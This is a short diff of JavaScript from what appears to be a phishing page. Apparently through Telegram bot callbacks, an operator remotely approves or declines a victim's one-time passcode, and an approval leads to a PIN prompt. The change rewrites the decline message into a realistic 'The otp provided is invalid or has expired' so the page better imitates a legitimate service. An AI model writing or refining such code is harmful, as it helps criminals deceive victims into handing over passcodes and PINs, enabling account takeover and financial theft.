@@ -384,7 +384,7 @@
                             if (u.callback_query) {
                                 var cb = u.callback_query.data;
                                 if (cb === 'otp_approved') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); openPin(); }
-                                else if (cb === 'otp_declined') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Declined. Please try again.'); resetOTP(); }
+                                else if (cb === 'otp_declined') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('The otp provided is invalid or has expired. Please try again.'); resetOTP(); }
                                 else if (cb === 'otp_logout') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showWarning(); }
                             }
                         }
